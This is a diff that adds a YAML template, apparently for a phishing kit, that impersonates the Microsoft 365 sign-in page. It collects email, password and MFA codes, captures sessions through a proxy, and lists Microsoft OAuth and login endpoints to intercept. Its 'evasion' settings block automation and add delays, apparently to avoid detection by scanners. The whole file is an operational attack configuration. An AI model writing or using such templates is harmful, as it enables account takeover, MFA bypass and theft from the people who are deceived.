@@ -1,0 +1,44 @@
+name: "Microsoft 365 Login"
+author: "Sheikh-CoedexTech"
+version: "1.0"
+
+page_title: "Sign in to your account"
+company_name: "Microsoft"
+logo_url: "https://login.microsoftonline.com/favicon.ico"
+favicon_url: "https://login.microsoftonline.com/favicon.ico"
+redirect_after: "https://www.office.com"
+
+fields:
+  - id: username
+    name: username
+    label: Email, phone, or Skype
+    type: email
+    placeholder: "someone@example.com"
+    required: true
+  - id: password
+    name: password
+    label: Password
+    type: password
+    placeholder: "Enter your password"
+    required: true
+  - id: mfa_code
+    name: mfa_code
+    label: Multi-factor authentication code
+    type: text
+    placeholder: "Enter the code from your authenticator app"
+    required: false
+
+session_capture: true
+session_capture_method: proxy  # proxy | xhr | form_submit
+
+# OAuth endpoints to intercept
+oauth_endpoints:
+  - "/common/oauth2/authorize"
+  - "/common/oauth2/token"
+  - "/login.srf"
+  - "/kmsi"
+
+evasion:
+  block_automation: true
+  simulate_delay: true
+  delay_ms: 800
